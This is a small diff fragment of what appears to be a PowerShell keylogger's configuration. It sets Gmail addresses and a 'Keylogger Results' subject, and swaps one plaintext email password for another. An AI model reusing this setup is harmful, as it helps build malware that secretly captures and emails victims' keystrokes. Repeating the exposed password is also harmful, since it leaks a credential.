@@ -2,7 +2,7 @@
 $TimesToRun = 2
 $RunTimeP = 1
 $From = "rpduino@gmail.com"
-$Pass = "thisisfucked"
+$Pass = "db789rpca!"
 $To = "rpduino@gmail.com"
 $Subject = "Keylogger Results"
 $body = "Keylogger Results"
